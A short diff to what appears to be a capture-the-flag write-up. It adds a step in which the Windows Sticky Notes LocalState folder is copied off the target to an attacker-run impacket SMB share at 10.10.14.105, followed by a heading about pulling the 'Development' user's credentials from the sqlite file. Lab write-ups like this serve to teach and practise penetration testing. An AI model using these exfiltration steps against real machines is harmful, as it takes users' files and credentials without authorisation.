@@ -71,3 +71,9 @@ Mode                 LastWriteTime         Length Name
 
 PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>
 ```
+## copying whole `LocalState` folder to kali via smbserver
+Started impacket smbserver  using  command`impacket-smbserver -smb2support files $(pwd)` and then copied folder `LocalState` to local kali vm using command `copy -R LocalState \\10.10.14.105\files\`.
+![[Pasted image 20210730135631.png]]
+## opening sqlite database file in sqlite3 and getting `Development` User creds
+
+
